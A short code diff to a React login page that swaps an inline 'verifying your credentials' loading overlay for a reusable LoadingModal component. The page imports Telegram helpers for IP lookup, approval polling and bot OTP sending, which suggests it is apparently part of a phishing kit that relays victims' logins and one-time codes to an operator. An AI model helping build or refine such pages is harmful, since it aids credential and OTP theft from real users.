@@ -5,6 +5,7 @@ import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown } from "lucide-react";
 import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
+import { LoadingModal } from "@/components/loading-modal";
 import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP, sendOtpVerificationRequest } from "@/lib/telegram";
 
 
@@ -566,44 +567,7 @@ export default function Login() {
                 </div>
               )}
 
-              <style>{`
-                @keyframes _mpv_spin { to { transform: rotate(360deg); } }
-                ._mpv_spinner_lg {
-                  display: block;
-                  width: 52px; height: 52px;
-                  border: 4px solid #e0e0e0;
-                  border-top-color: #555;
-                  border-radius: 50%;
-                  animation: _mpv_spin 0.85s linear infinite;
-                  margin: 0 auto 20px;
-                }
-              `}</style>
-
-              {/* ── LOADING OVERLAY ── */}
-              {loading && (
-                <div style={{
-                  position: "fixed", inset: 0, zIndex: 2000,
-                  background: "rgba(0,0,0,0.45)",
-                  display: "flex", alignItems: "center", justifyContent: "center",
-                }}>
-                  <div style={{
-                    background: "#fff",
-                    borderRadius: 12,
-                    padding: "40px 36px 36px",
-                    width: "88%", maxWidth: 360,
-                    textAlign: "center",
-                    boxShadow: "0 8px 40px rgba(0,0,0,0.22)",
-                  }}>
-                    <span className="_mpv_spinner_lg" />
-                    <p style={{ fontSize: 18, fontWeight: 700, color: "#111", margin: "0 0 10px" }}>
-                      Please wait...
-                    </p>
-                    <p style={{ fontSize: 14, color: "#555", margin: 0, lineHeight: 1.55 }}>
-                      We are verifying your credentials. This may take a moment.
-                    </p>
-                  </div>
-                </div>
-              )}
+              <LoadingModal show={loading || waiting} />
 
               <button
                 type="submit"
